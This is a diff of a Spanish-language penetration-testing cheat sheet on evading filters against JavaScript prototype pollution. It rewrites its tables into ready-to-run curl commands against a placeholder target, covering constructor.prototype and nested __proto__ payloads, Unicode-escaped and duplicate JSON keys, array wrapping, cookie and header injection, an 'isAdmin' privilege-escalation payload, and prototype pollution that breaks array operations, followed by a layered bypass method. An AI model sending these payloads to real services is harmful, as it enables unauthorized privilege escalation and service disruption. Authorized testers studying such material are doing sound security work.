@@ -22,16 +22,13 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Filter `__proto__` literal | Usar `constructor.prototype` | Equivalente — modifica prototype también. |
-| Payload constructor | `{"constructor":{"prototype":{"polluted":"yes"}}}` | Standard bypass. |
-| Filter ambos | Buscar otras chains: `Object.constructor.prototype` | Walk further. |
-| Filter top-level keys | `{"a":{"__proto__":{"polluted":"yes"}}}` | Nested keys pasan checks de top-level. |
-| Filter substring `proto` | `constructor.prototype` no contiene `proto` | Substring filter bypass. |
-| Filter regex `/proto/i` | `constructor[\\u0070rototype]` | Unicode escape. |
-| Filter regex strict | Usar Object.defineProperty pattern (raro) | Edge case. |
-| Lodash <4.17.21 | `__proto__` filtered, `constructor.prototype` works | Common reality. |
-| Filter `prototype` también | Buscar property paths alternativos | Less común. |
-| Map / Set objects | Map/Set tienen propios prototypes | Niche. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":"yes"}}}' https://target/api/x` | Equivalente a `__proto__` — modifica prototype también | Filter strip `__proto__` literal. |
+| `curl -X POST -d '{"a":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` | Nested __proto__ — bypass top-level filter | Filter solo top-level keys. |
+| `curl -X POST -d '{"constructor":{"prototype":{"isAdmin":true}}}' https://target/api/x` | Privesc via constructor.prototype | Filter __proto__ but no constructor. |
+| `curl -X POST -d '{"a":{"constructor":{"prototype":{"polluted":"yes"}}}}' https://target/api/x` | Nested constructor.prototype | Combined bypass. |
+| `curl -X POST -d '{"Object":{"prototype":{"polluted":"yes"}}}' https://target/api/x` (less common) | Object.prototype direct | Edge case. |
+| `curl -X POST -d '{"\\u005f\\u005fproto\\u005f\\u005f":{"polluted":"yes"}}' https://target/api/x` (Unicode escape `_`) | Unicode escape `__proto__` | Filter substring match. |
+| Inspect frontend code: `grep -E 'replace.*__proto__\|filter.*proto' main.js` | Identify filter patterns | Pre-attack. |
 ^pp-bypass-constructor
 
 ___
@@ -40,16 +37,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Dot notation (lodash set) | `_.set(obj, '__proto__.polluted', 'yes')` | Default. |
-| Bracket array notation | `_.set(obj, ['__proto__','polluted'], 'yes')` | Bypass de filter en string parsing. |
-| URL bracket | `?obj[__proto__][polluted]=yes` | qs lib. |
-| URL dot | `?obj.__proto__.polluted=yes` | Other parsers. |
-| URL mixed | `?obj[__proto__].polluted=yes` | Some parsers. |
-| JSON nested | `{"obj":{"__proto__":{"polluted":"yes"}}}` | Standard. |
-| JSON with dot in key | `{"obj.__proto__.polluted":"yes"}` | Si parser hace deep set por dot. |
-| Bracket numeric | `?[0][__proto__][x]=y` | Array index notation. |
-| Mixed encoding | `?[%5F%5Fproto%5F%5F]=...` | URL-encoded `__proto__`. |
-| Special chars insertion | `__proto__` | Unicode escape en JSON. |
+| `curl -X POST -d '{"path":["__proto__","polluted"],"value":"yes"}' https://target/api/set` | Array path (lodash `_.set`) | `_.set(obj, '__proto__.polluted', 'yes')` string filter bypass. |
+| `curl "https://target/?obj[__proto__][polluted]=yes"` | Bracket notation URL (qs lib) | qs deep parse. |
+| `curl "https://target/?obj.__proto__.polluted=yes"` | Dot notation URL | Custom parsers. |
+| `curl "https://target/?obj[__proto__].polluted=yes"` | Mixed bracket+dot | Some parsers. |
+| `curl -X POST -d '{"obj.__proto__.polluted":"yes"}' https://target/api/x` | JSON con dot en key (parsed deep) | Parser hace deep set por dot. |
+| `curl "https://target/?[0][__proto__][x]=y"` | Array index notation | Array root path. |
+| `curl "https://target/?%5B__proto__%5D=yes"` (URL-encoded brackets) | Encoded bracket bypass | Decode-after-filter. |
 ^pp-bypass-notation
 
 ___
@@ -58,16 +52,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Unicode escape | `{"\\u005f\\u005fproto\\u005f\\u005f":{"x":"y"}}` | `_` = `_`. |
-| Hex escape JSON | NO existe — JSON solo soporta `\u` | (incorrect; safe). |
-| Spaces/whitespace | `{"__proto__"  :  {"x":"y"}}` | Algunos filters strict regex. |
-| Trailing comma | `{"__proto__":{"x":"y"},}` | JSON5 / lax parsers. |
-| Comments JSON5 | `{"__proto__"/*comment*/:{"x":"y"}}` | JSON5 only. |
-| Number key | `{"0":{"__proto__":...}}` | Index 0 + nested. |
-| Empty key | `{"":{"__proto__":...}}` | Empty string key — some parsers buggy. |
-| Duplicated key | `{"__proto__":1,"__proto__":{"x":"y"}}` | Last wins en mayoría. |
-| Boolean key (no válido JSON) | n/a | n/a. |
-| Float key | `{"1.5":{"__proto__":...}}` | Edge. |
+| `curl -X POST -d '{"\\u005f\\u005fproto\\u005f\\u005f":{"polluted":"yes"}}' https://target/api/x` | Unicode escape `__proto__` (`_` = `_`) | JSON parser unicode-aware. |
+| `curl -X POST -d '{"__proto__"  :  {"polluted":"yes"}}' https://target/api/x` | Whitespace en JSON key | Regex strict en spacing. |
+| `curl -X POST -d '{"__proto__":{"polluted":"yes"},}' https://target/api/x` (trailing comma) | JSON5 / lax parsers | Parser tolerant. |
+| `curl -X POST -d '{"":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` (empty key) | Empty string key | Parser buggy. |
+| `curl -X POST -d '{"__proto__":1,"__proto__":{"polluted":"yes"}}' https://target/api/x` (duplicate) | Duplicate key last-wins | Parser-dependent. |
+| `curl -X POST -d '{"0":{"__proto__":{"polluted":"yes"}}}' https://target/api/x` | Numeric key + nested | Index 0 + nested. |
+| `curl -X POST -H "Content-Type: application/json5" -d '{"__proto__"/*comment*/:{"x":"y"}}' https://target/api/x` | JSON5 comments | JSON5-aware parser. |
 ^pp-bypass-encoding
 
 ___
@@ -76,15 +67,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Array index `__proto__` | `[1,2,{"__proto__":{"x":"y"}}]` | Inside array element. |
-| Array as top-level | `[{"__proto__":{"x":"y"}}]` | Array root. |
-| Mixed array | `[null, "x", {"__proto__":...}]` | Heterogeneous. |
-| Length confusion | `{"__proto__":{"length":99999}}` | Affecting array iteration. |
-| Array prototype pollution | Pollute Array.prototype específicamente | `[].push` etc affected. |
-| Combine con number param | `?[]=1&__proto__[x]=y` | qs array notation. |
-| Array tuple | `[["__proto__",{"x":"y"}]]` | Nested array structure. |
-| Buffer / TypedArray | Polluciar Buffer.prototype | Node-specific. |
-| Object spread to array | `[...obj]` con polluted obj | Edge case. |
+| `curl -X POST -d '[{"__proto__":{"polluted":"yes"}}]' https://target/api/x` | Array root con object con __proto__ | Backend expects array. |
+| `curl -X POST -d '[1,2,{"__proto__":{"polluted":"yes"}}]' https://target/api/x` | Mixed array | Iteration vulnerable. |
+| `curl -X POST -d '{"__proto__":{"length":99999}}' https://target/api/x` | Pollute length → array iteration breaks | DoS adjacent. |
+| `curl -X POST -d '[["__proto__",{"polluted":"yes"}]]' https://target/api/x` | Nested tuple structure | Edge parser. |
+| `curl "https://target/?[]=1&__proto__[x]=y"` | qs array + PP combo | Mixed types. |
+| `curl -X POST -d '{"__proto__":{"push":null}}' https://target/api/x` | Pollute Array.prototype.push | Array operations break. |
+| `curl -X POST -d '{"a":[{"__proto__":{"x":"y"}}]}' https://target/api/x` | Object con array con PP | Combined polyglot. |
 ^pp-bypass-array
 
 ___
@@ -93,35 +82,27 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Cookie con `__proto__` | `Cookie: __proto__=...` | Si lib parsing es vulnerable. |
-| Cookie nested | `Cookie: obj=__proto__:value` | Custom parsers. |
-| Header value JSON | `X-Config: {"__proto__":{"x":"y"}}` | If app parses header como JSON. |
-| Multi-line header | Folded headers con keys | Edge. |
-| WS subprotocol | `Sec-WebSocket-Protocol: __proto__` | If parsed. |
-| User-Agent JSON | UA con JSON (bizarro) | Custom apps. |
-| GraphQL operationName | `?operationName=__proto__` | If used as key. |
-| OAuth state JSON | State param con JSON | Custom flows. |
-| Authorization header | Bearer token JSON-style | Edge. |
+| `curl -b '__proto__={"polluted":"yes"}' https://target/api/x` | Cookie PP injection | App parsea cookie como JSON. |
+| `curl -H 'X-Config: {"__proto__":{"polluted":"yes"}}' https://target/api/x` | Header JSON value | App parsea header como JSON. |
+| `curl -b 'config={"__proto__":{"isAdmin":true}}' https://target/api/x` | Cookie config pollution | Config-via-cookie pattern. |
+| `curl -H 'Authorization: Bearer eyJ_polluted_token' https://target/api/x` | JWT con `__proto__` claim si parser laxo | JWT parser pollution. |
+| `curl -H 'X-Forwarded-Headers: __proto__' https://target/api/x` | Header name injection | Custom header processing. |
+| `curl "https://target/graphql?operationName=__proto__&query={x}"` | GraphQL operationName con __proto__ | If used como key en merge. |
+| `curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "__proto__[x]=y" https://target/api/x` | Form-encoded body PP | body-parser + qs combo. |
 ^pp-bypass-header
 
 ### Patrón general bypass
 
 ```
-1. Identificar filtro:
-   - Substring match (__proto__, proto, prototype)
-   - Regex (case sensitive / insensitive)
-   - Type-based (object vs array)
-   - Position-based (top-level vs nested)
-
+1. Identificar filtro: substring / regex / type-based / position-based
 2. Aplicar bypass por capa:
-   - Substring: usar constructor.prototype, encoding, escape
-   - Regex: notación distinta (bracket/dot/array)
-   - Type: array wrap, polyglot
-   - Position: nested deep
-
+   - Substring (__proto__ literal): constructor.prototype, Unicode escape, encoding
+   - Regex case-sensitive: case mixed, nested key
+   - Type-based: array wrap, polyglot JSON
+   - Position-based: nested deep en object
 3. Combinar capas:
    - constructor.prototype + nested + URL bracket notation
-   - Unicode escape + JSON nested
+   - Unicode escape + JSON nested + duplicate key
 ```
 
 ***
